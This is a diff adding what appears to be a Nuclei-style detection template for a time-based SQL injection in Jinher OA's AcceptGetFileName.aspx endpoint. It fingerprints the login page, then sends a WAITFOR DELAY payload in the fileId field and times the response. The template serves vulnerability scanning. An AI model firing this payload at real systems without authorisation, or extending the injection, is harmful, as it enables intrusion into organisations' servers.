@@ -1,0 +1,47 @@
+id: poc-yaml-jinher-acceptgetfilename-sqli
+info:
+  name: 金和OA AcceptGetFileName.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - '{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'JHSoft'
+
+  - id: step-2
+    method: POST
+    path:
+      - '{{BaseURL}}/c6/Jhsoft.Web.Accept/AcceptGetFileName.aspx/'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'fileId=-1)WAITFOR DELAY ''0:0:{{t1}}''--'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'D:\\JINHER\\upload\\Resource'
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1)'
+          - 'duration <= to_number(t2)'
